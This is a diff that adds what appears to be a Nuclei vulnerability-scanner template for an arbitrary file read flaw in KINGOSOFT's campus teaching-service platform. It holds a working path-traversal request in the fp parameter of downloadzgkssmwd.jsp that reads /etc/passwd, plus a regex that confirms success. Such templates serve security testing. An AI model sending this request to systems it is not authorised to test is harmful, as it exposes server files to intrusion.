@@ -1,0 +1,23 @@
+id: KINGOSOFT-downloadzgkssmwd_jsp-File-reading
+
+info:
+  name: KINGOSOFT 高校智慧校园教学综合服务平台 downloadzgkssmwd.jsp 任意文件读取漏洞
+  author: KINGOSOFT
+  severity: high
+  tags: File reading
+
+http:
+  - raw:
+      - |
+        GET /zgks/downloadzgkssmwd.jsp?fp=../../../../../../../../../../../etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36(KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - 'root:.*:0:0'
+      - type: status
+        status: 
+          - 200
